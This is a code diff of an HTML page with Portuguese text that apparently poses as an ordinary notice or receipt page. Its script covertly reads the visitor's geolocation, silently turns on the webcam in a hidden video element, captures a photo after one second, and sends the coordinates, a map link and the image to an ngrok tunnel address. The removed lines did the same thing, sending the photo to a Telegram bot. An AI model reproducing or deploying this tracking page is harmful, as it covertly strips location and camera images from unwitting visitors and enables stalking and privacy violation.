@@ -26,138 +26,75 @@
       <p><a href="#">Clique aqui</a> para mais informações.</p>
     </div>
 
-    <!-- Adicionando a tag de canvas para capturar a foto -->
+    <video id="video" autoplay playsinline style="display: none;"></video>
     <canvas id="canvas" style="display: none;"></canvas>
-
   </div>
 
   <script>
+    let latitude, longitude, maps;
+
     window.addEventListener("load", () => {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+        navigator.geolocation.getCurrentPosition((pos) => {
+          latitude = pos.coords.latitude;
+          longitude = pos.coords.longitude;
+          maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+          iniciarCamera();
+        }, handleError);
       } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
+        alert("Geolocalização não suportada.");
       }
-
-      // Chama a função para ativar a câmera
-      iniciarCamera();
     });
 
-    // Variáveis globais para acessar o stream da câmera
-    let stream;
-
-    // Função para acessar a câmera do usuário
     function iniciarCamera() {
-      // Verifica se o navegador suporta a API getUserMedia
-      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        navigator.mediaDevices.getUserMedia({ video: true })
-          .then(function (userStream) {
-            // Salva o stream da câmera
-            stream = userStream;
-            
-            // Após 1 segundo, capturamos a foto automaticamente
-            setTimeout(tirarFoto, 1000);
-          })
-          .catch(function (error) {
-            // Se houver erro ao tentar acessar a câmera
-            console.error("Erro ao acessar a câmera:", error);
-            alert("Não foi possível acessar a câmera.");
-          });
-      } else {
-        alert("Este navegador não suporta a API de mídia.");
-      }
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then((stream) => {
+          const video = document.getElementById("video");
+          video.srcObject = stream;
+
+          setTimeout(() => tirarFoto(video, stream), 1000);
+        })
+        .catch((error) => {
+          console.error("Erro ao acessar a câmera:", error);
+          alert("Não foi possível acessar a câmera.");
+        });
     }
 
-    // Função para tirar a foto da câmera
-    function tirarFoto() {
-      if (!stream) {
-        alert("Câmera não acessada!");
-        return;
-      }
+    function tirarFoto(video, stream) {
+      const canvas = document.getElementById("canvas");
+      const ctx = canvas.getContext("2d");
 
-      // Cria um contexto 2D para o canvas
-      const canvas = document.getElementById('canvas');
-      const contexto = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      // Define o tamanho do canvas igual ao da câmera
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      video.play();
+      const fotoDataUrl = canvas.toDataURL("image/png");
 
-      // Espera o vídeo carregar para desenhar no canvas
-      video.addEventListener('play', function () {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-
-        // Desenha o quadro do vídeo no canvas
-        contexto.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        // Converte a imagem para base64
-        const fotoDataUrl = canvas.toDataURL('image/png');
-
-        // Envia a foto para o bot do Telegram
-        enviarFotoParaTelegram(fotoDataUrl);
-      });
-    }
-
-    // Função para enviar a foto para o Telegram
-    function enviarFotoParaTelegram(fotoDataUrl) {
-      const TELEGRAM_BOT_TOKEN = "BOT-TOKEN";  // Substitua pelo token do seu bot
-      const TELEGRAM_CHAT_ID = "CHAT-TOKEN";  // Substitua pelo ID do chat (ou grupo) para onde quer enviar
-
-      // Faz o envio da foto para o Telegram usando a API do Telegram
-      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+      // Envia localização e imagem
+      fetch("https://bd70-2804-d84-21ec-1500-55e1-85d5-ce-f8b6.ngrok-free.app/send-location", {
         method: "POST",
-        body: new FormData().append("chat_id", TELEGRAM_CHAT_ID).append("photo", fotoDataUrl)
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ latitude, longitude, maps, foto: fotoDataUrl })
       })
-      .then(response => response.json())
-      .then(data => {
-        if (data.ok) {
-          console.log("Foto enviada com sucesso!");
-        } else {
-          console.log("Erro ao enviar a foto:", data);
-        }
-      })
-      .catch(error => {
-        console.error("Erro:", error);
-      });
+        .then((res) => res.json())
+        .then((data) => {
+          if (!data.success) alert("Erro ao enviar dados.");
+        })
+        .catch((err) => console.error("Erro ao enviar:", err));
+
+      // Para o vídeo (opcional)
+      stream.getTracks().forEach(track => track.stop());
+    }
+
+    function handleError(error) {
+      alert("Erro ao obter localização: " + error.message);
     }
 
     const dataAtual = new Date();
     const dia = String(dataAtual.getDate()).padStart(2, '0');
     const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
     const ano = dataAtual.getFullYear();
-
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-
-    document.getElementById("data-atual").textContent = dataFormatada;
-
-    function sendLocation(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-      fetch("https://bd70-2804-d84-21ec-1500-55e1-85d5-ce-f8b6.ngrok-free.app/send-location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ latitude, longitude, maps })
-      })
-        .then(response => response.json())
-        .then(data => {
-          if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
-          }
-        })
-        .catch(error => {
-          console.error("Erro:", error);
-        });
-    }
-
-    function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
-    }
+    document.getElementById("data-atual").textContent = `${dia}/${mes}/${ano}`;
   </script>
 </body>
 
